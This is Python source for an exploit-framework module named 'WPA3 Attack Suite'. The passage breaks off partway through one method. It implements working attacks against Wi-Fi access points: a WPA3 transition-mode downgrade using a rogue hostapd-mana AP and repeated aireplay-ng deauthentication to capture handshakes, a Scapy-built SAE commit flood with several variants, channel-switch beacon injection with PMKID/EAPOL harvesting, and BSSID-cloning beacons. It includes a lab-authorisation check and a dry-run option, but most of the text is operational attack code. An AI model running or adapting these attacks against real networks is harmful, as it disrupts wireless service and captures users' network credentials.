class Exploit(Exploit):
    """WPA3 lab orchestration: downgrade, SAE flood, CSA, timing, auto."""

    __info__ = {
        "name": "WPA3 Attack Suite",
        "description": (
            "Authorised-lab bridge: WPA3 transition downgrade (DragonShift / "
            "WPA3-Transition-mode-Downgrade-attack), SAE commit flood (dragon-drain, "
            "Nuseo1, sae_clogging_attack), CSA injection (Politician-style), "
            "and passive SAE timing stats (wpa3_sec-inspired)."
        ),
        "authors": ("André Henrique (@mrhenrike) | União Geek",),
        "references": (
            "submodules/IoT/wireless-research/DragonShift",
            "submodules/IoT/wireless-research/WPA3-Transition-mode-Downgrade-attack",
            "submodules/IoT/wireless-research/dragon-drain-wpa3-airgeddon-plugin",
            "submodules/IoT/wireless-research/WPA3-Attack-Nuseo1",
            "submodules/IoT/wireless-research/Politician",
            "submodules/IoT/wireless-research/wpa3_sec",
            "submodules/IoT/wireless-research/wpa3-sae-flood-anomaly-detection",
        ),
        "devices": ("wifi",),
    }

    interface = OptString("wlan0mon", "Wi-Fi interface in monitor mode")
    target_bssid = OptMAC("00:00:00:00:00:00", "Target AP BSSID")
    target_ssid = OptString("", "Target ESS")
    target_channel = OptInteger(6, "Target AP channel")
    attack = OptString(
        "auto",
        "Attack: downgrade | sae_flood | csa | double_ssid | timing | auto",
    )
    flood_variant = OptString(
        "standard",
        "SAE flood variant: omnivore | muted | cookie_guzzler | standard",
    )
    rogue_interface = OptString("", "Second interface for rogue AP (hostapd-mana)")
    handshake_output = OptString(
        "",
        "Output prefix for capture (.cap) or directory for mana .hccapx sibling",
    )
    flood_rate = OptInteger(200, "Target packets per second (Scapy SAE flood)")
    csa_channel = OptInteger(1, "New channel in CSA IE (rogue / hop target)")
    csa_harvest = OptBool(False, "Capture PMKID/EAPOL during CSA attack window")
    duration = OptInteger(60, "Attack duration (seconds); 0 = run until Ctrl+C")
    dry_run = OptBool(False, "Print plan only")
    rogue_wpa_passphrase = OptString(
        "",
        "WPA2 PSK for rogue AP (8+ chars); required for downgrade with encryption",
        advanced=True,
    )
    dragon_drain_binary = OptString(
        "",
        "Optional path to dragon-drain style binary (-d -a -c …)",
        advanced=True,
    )
    sae_clogging_binary = OptString(
        "",
        "Override path to sae_clogging_attack (default: search wireless-research build)",
        advanced=True,
    )
    deauth_client = OptMAC(
        "FF:FF:FF:FF:FF:FF",
        "Deauth target client MAC (broadcast if FF…)",
        advanced=True,
    )

    _VALID_ATTACKS = frozenset({"downgrade", "sae_flood", "csa", "double_ssid", "timing", "auto"})
    _VALID_FLOOD = frozenset({"omnivore", "muted", "cookie_guzzler", "standard"})

    def _bssid_str(self) -> str:
        """Normalised target BSSID string."""
        return str(self.target_bssid).strip().lower()

    def _require_bssid(self) -> bool:
        mac = self._bssid_str()
        if not mac or mac == "00:00:00:00:00:00":
            print_error("Set target_bssid.")
            return False
        return True

    def _scapy(self) -> Any:
        """Lazy-import Scapy (optional dependency)."""
        try:
            import scapy.all as scapy_mod
            from scapy.all import Dot11

            return scapy_mod
        except ImportError:
            print_error("Scapy is required for this mode. Install: pip install scapy")
            return None

    def check(self) -> None:
        """Surface tool availability for lab prep."""
        print_status(f"WPA3 Attack Suite {__version__}")
        wr = _wireless_research_root()
        print_info("wireless-research: {}".format(wr if wr.is_dir() else "(missing)"))
        print_info("sae_clogging_attack: {}".format(_find_sae_clogging_binary() or "(not built)"))
        print_info("hostapd-mana: {}".format(shutil.which("hostapd-mana") or "(not in PATH)"))
        print_info("aireplay-ng: {}".format(shutil.which("aireplay-ng") or "(not in PATH)"))

    def run(self) -> None:
        """Dispatch selected attack mode."""
        require_authorised_lab()
        atk = str(self.attack).strip().lower()
        if atk not in self._VALID_ATTACKS:
            print_error("Invalid attack '{}'. Use: {}".format(atk, ", ".join(sorted(self._VALID_ATTACKS))))
            return
        fv = str(self.flood_variant).strip().lower()
        if fv not in self._VALID_FLOOD:
            print_error("Invalid flood_variant.")
            return

        if atk == "downgrade":
            self._run_downgrade()
        elif atk == "sae_flood":
            self._run_sae_flood()
        elif atk == "csa":
            self._run_csa()
        elif atk == "double_ssid":
            self._run_double_ssid()
        elif atk == "timing":
            self._run_timing()
        else:
            self._run_auto()

    def _handshake_paths(self) -> tuple[Path, Path]:
        """Resolve .cap prefix for airodump and .hccapx path for mana_wpaout."""
        raw = str(self.handshake_output).strip()
        if not raw:
            base = _project_tmp() / "wpa3_suite_handshake"
        else:
            base = Path(raw)
            if base.suffix.lower() in {".cap", ".pcap", ".pcapng"}:
                base = base.with_suffix("")
            elif base.is_dir():
                base = base / "wpa3_handshake"
        hccapx = Path(str(base) + ".hccapx")
        return base, hccapx

    def _run_downgrade(self) -> None:
        """WPA3 transition downgrade: rogue WPA2 AP + deauth + capture (DragonShift-style)."""
        if not self._require_bssid():
            return
        if not str(self.target_ssid).strip():
            print_error("Set target_ssid for rogue AP cloning.")
            return
        rogue = str(self.rogue_interface).strip()
        if not rogue:
            print_error("Set rogue_interface (managed/AP-capable) for hostapd-mana.")
            return
        passphrase = str(self.rogue_wpa_passphrase).strip()
        if len(passphrase) < 8:
            print_error("Set rogue_wpa_passphrase (min 8 chars) to mirror WPA2 PSK downgrade lab.")
            return

        mana = shutil.which("hostapd-mana")
        if not mana:
            print_error("hostapd-mana not found (see DragonShift / WPA3-Transition README).")
            return

        cap_base, hccapx_path = self._handshake_paths()
        ch = int(self.target_channel)
        ssid = str(self.target_ssid)

        conf = "\n".join(
            [
                f"interface={rogue}",
                "driver=nl80211",
                "hw_mode=g",
                f"channel={ch}",
                f"ssid={ssid}",
                f"mana_wpaout={hccapx_path.resolve()}",
                "wpa=2",
                "wpa_key_mgmt=WPA-PSK",
                "wpa_pairwise=TKIP CCMP",
                'wpa_passphrase="{}"'.format(passphrase.replace('"', "")),
            ]
        ) + "\n"

        cfg_path = _project_tmp() / "wpa3_downgrade_hostapd_mana.conf"
        if self.dry_run:
            print_status(f"[dry_run] Would write {cfg_path}:\n{conf}")
            print_info(f"Deauth: aireplay-ng -0 5 -a {self.target_bssid} -c {self.deauth_client} {self.interface}")
            return

        cfg_path.write_text(conf, encoding="utf-8")
        _set_monitor_channel(str(self.interface), ch)

        print_status(f"Starting hostapd-mana (rogue WPA2); capture -> {hccapx_path}")
        proc = subprocess.Popen(
            [mana, str(cfg_path)],
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            encoding="utf-8",
            errors="replace",
        )

        stop = threading.Event()

        def _drain_mana_out() -> None:
            if proc.stdout:
                for line in iter(proc.stdout.readline, ""):
                    if not line:
                        break
                    print_status(f"[mana] {line.rstrip()}")
                    if "Captured a WPA/2 handshake" in line or "handshake" in line.lower():
                        print_success(f"hostapd-mana reported handshake activity; check {hccapx_path}")
            stop.set()

        threading.Thread(target=_drain_mana_out, daemon=True).start()

        def _deauth_loop() -> None:
            ar = shutil.which("aireplay-ng")
            if not ar:
                logger.warning("aireplay-ng missing; run deauth manually")
                return
            end = time.time() + float(self.duration) if int(self.duration) > 0 else None
            while not stop.is_set():
                if end is not None and time.time() >= end:
                    break
                subprocess.run(
                    [
                        ar,
                        "-0",
                        "5",
                        "-a",
                        str(self.target_bssid),
                        "-c",
                        str(self.deauth_client),
                        str(self.interface),
                    ],
                    capture_output=True,
                    timeout=30,
                )
                time.sleep(2.0)

        deauth_thread = threading.Thread(target=_deauth_loop, daemon=True)
        deauth_thread.start()

        try:
            if int(self.duration) > 0:
                time.sleep(int(self.duration))
            else:
                while proc.poll() is None:
                    time.sleep(0.5)
        except KeyboardInterrupt:
            print_status("Stopping hostapd-mana…")
        finally:
            stop.set()
            proc.terminate()
            try:
                proc.wait(timeout=5)
            except subprocess.TimeoutExpired:
                proc.kill()

    def _duration_seconds(self, override: int | None = None) -> int:
        """Effective duration; 0 means unlimited."""
        if override is not None:
            return int(override)
        return int(self.duration)

    def _run_sae_flood(self, duration_override: int | None = None) -> None:
        """SAE commit flood: prefer sae_clogging_attack / dragon-drain binary; else Scapy.

        Args:
            duration_override: If set, seconds to run (overrides option ``duration``).
        """
        if not self._require_bssid():
            return
        iface = str(self.interface)
        ch = int(self.target_channel)
        variant = str(self.flood_variant).strip().lower()
        dur = self._duration_seconds(duration_override)

        override_clog = str(self.sae_clogging_binary).strip()
        clog_path = Path(override_clog) if override_clog else _find_sae_clogging_binary()
        dragon = str(self.dragon_drain_binary).strip()

        if self.dry_run:
            print_status(
                f"[dry_run] SAE flood on {self.target_bssid} ch={ch} variant={variant} rate={int(self.flood_rate)} pps"
            )
            print_info("clog binary: {}".format(clog_path or "(none)"))
            print_info("dragon-drain: {}".format(dragon or "(none)"))
            return

        _set_monitor_channel(iface, ch)

        if clog_path and clog_path.is_file():
            print_status(f"Running sae_clogging_attack ({clog_path})")
            try:
                subprocess.run(
                    [str(clog_path), iface, str(self.target_bssid).upper()],
                    timeout=dur if dur > 0 else None,
                    check=False,
                )
            except subprocess.TimeoutExpired:
                print_status("sae_clogging_attack stopped after duration.")
            return

        if dragon:
            # airgeddon-style dragon drain invocation (wpa3_dragon_drain_attack.py)
            cmd = [
                dragon,
                "-d",
                iface,
                "-a",
                str(self.target_bssid),
                "-c",
                str(ch),
                "-b",
                "54",
                "-n",
                "20",
                "-r",
                str(int(self.flood_rate)),
            ]
            print_status("Running dragon-drain binary: {}".format(" ".join(cmd)))
            subprocess.run(cmd, check=False)
            return

        scapy = self._scapy()
        if not scapy:
            return
        from scapy.all import Dot11, Dot11Auth, RadioTap, RandMAC, sendp  # type: ignore

        ap = str(self.target_bssid).lower()
        rate = max(1, int(self.flood_rate))
        if variant == "muted":
            rate = max(1, rate // 2)
        interval = 1.0 / float(rate)
        end_t = time.time() + dur if dur > 0 else None

        def _send_one(seq: int) -> None:
            src = str(RandMAC())
            if variant == "cookie_guzzler" and random.random() < 0.5:
                seq = 2
            bssid_field = ap
            if variant == "omnivore":
                bssid_field = ap if random.random() < 0.5 else str(RandMAC())
            elif variant == "standard" and random.random() > 0.85:
                bssid_field = str(RandMAC())
            dot11 = Dot11(
                type=0,
                subtype=11,
                addr1=ap,
                addr2=src,
                addr3=bssid_field,
            )
            pkt = RadioTap() / dot11 / Dot11Auth(algo=3, seqnum=seq, status=0)
            sendp(pkt, iface=iface, verbose=0)

        if variant == "omnivore":

            def _worker() -> None:
                local_end = end_t
                while local_end is None or time.time() < local_end:
                    _send_one(1)
                    time.sleep(interval * 0.25)

            threads = [threading.Thread(target=_worker, daemon=True) for _ in range(min(8, max(2, rate // 50)))]
            for t in threads:
                t.start()
            try:
                if end_t:
                    while time.time() < end_t:
                        time.sleep(0.2)
                else:
                    while True:
                        time.sleep(1.0)
            except KeyboardInterrupt:
                pass
            return

        try:
            while end_t is None or time.time() < end_t:
                _send_one(1)
                if variant == "cookie_guzzler" and random.random() < 0.15:
                    _send_one(2)
                time.sleep(interval)
        except KeyboardInterrupt:
            print_status("SAE flood interrupted.")

    def _run_csa(self, duration_override: int | None = None) -> None:
        """Inject Politician-style CSA beacons (PMF-friendly client redirect hint).

        Args:
            duration_override: If set, seconds to run (overrides option ``duration``).
        """
        if not self._require_bssid():
            return
        if not str(self.target_ssid).strip():
            print_error("Set target_ssid for CSA beacon IE.")
            return

        scapy = self._scapy()
        if not scapy:
            return
        from scapy.all import Dot11, Dot11Beacon, Dot11Elt, RadioTap, sendp  # type: ignore

        iface = str(self.interface)
        bssid = str(self.target_bssid).lower()
        ssid = str(self.target_ssid).encode("utf-8", errors="ignore")
        cur_ch = int(self.target_channel)
        new_ch = int(self.csa_channel)
        _set_monitor_channel(iface, cur_ch)

        # CSA IE id 37: mode, new channel, switch count (Politician uses 1, 14, 1 in template;
        # we parameterise new channel and keep short count for lab bursts).
        csa_body = bytes([1, new_ch & 0xFF, 14])

        cap = 0x0431
        pkt = (
            RadioTap()
            / Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=bssid, addr3=bssid)
            / Dot11Beacon(timestamp=0, beacon_interval=0x64, cap=cap)
            / Dot11Elt(ID=0, info=ssid)
            / Dot11Elt(ID=3, info=bytes([cur_ch & 0xFF]))
            / Dot11Elt(ID=37, info=csa_body)
        )

        if self.dry_run:
            print_status(f"[dry_run] CSA burst: AP {bssid} current_ch={cur_ch} -> new_ch={new_ch}")
            if self.csa_harvest:
                print_info("[dry_run] PMKID/EAPOL harvest would run in parallel (airodump-ng).")
            return

        dsec = self._duration_seconds(duration_override)
        end_t = time.time() + dsec if dsec > 0 else None
        burst = 8
        harvest_proc = None
        if self.csa_harvest and shutil.which("airodump-ng"):
            cap_base, _ = self._handshake_paths()
            harvest_cmd = [
                "sudo",
                "airodump-ng",
                "--bssid",
                bssid,
                "-c",
                str(cur_ch),
                "-w",
                str(cap_base) + "_csa_harvest",
                "--output-format",
                "pcap,csv",
                iface,
            ]
            harvest_proc = subprocess.Popen(
                harvest_cmd,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )
            print_status("CSA harvest capture started.")
        try:
            while end_t is None or time.time() < end_t:
                for _ in range(burst):
                    sendp(pkt, iface=iface, verbose=0)
                    time.sleep(0.015)
                time.sleep(1.0)
        except KeyboardInterrupt:
            print_status("CSA injection stopped.")
        finally:
            if harvest_proc and harvest_proc.poll() is None:
                harvest_proc.terminate()
                try:
                    harvest_proc.wait(timeout=5)
                except subprocess.TimeoutExpired:
                    harvest_proc.kill()

    def _run_double_ssid(self) -> None:
        """Emit beacons cloning BSSID while advertising manipulated SSID."""
        if not self._require_bssid():
            return
        if not str(self.target_ssid).strip():
            print_error("Set target_ssid for double_ssid mode.")
            return
        scapy = self._scapy()
        if not scapy:
            return
        from scapy.all import Dot11, Dot11Beacon, Dot11Elt, RadioTap, RandString, sendp  # type: ignore

        iface = str(self.interface)
        bssid = str(self.target_bssid).lower()
        base_ssid = str(self.target_ssid)
        fake_ssid = f"{base_ssid[:24]}_clone"
        _set_monitor_channel(iface, int(self.target_channel))
        pkt = (
            RadioTap()
            / Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=bssid, addr3=bssid)
            / Dot11Beacon(cap=0x0431)
            / Dot11Elt(ID="SSID", info=fake_ssid.encode("utf-8", errors="ignore"))
            / Dot11Elt(ID="DSset", info=bytes([int(self.target_channel) & 0xFF]))
            / Dot11Elt(ID=221, info=bytes(RandString(size=6)))
        )
        if self.dry_run:
            print_status(f"[dry_run] double_ssid BSSID={bssid} fake_ssid={fake_ssid}")
            return
        end_t = time.time() + int(self.duration) if int(self.duration) > 0 else None
        try:
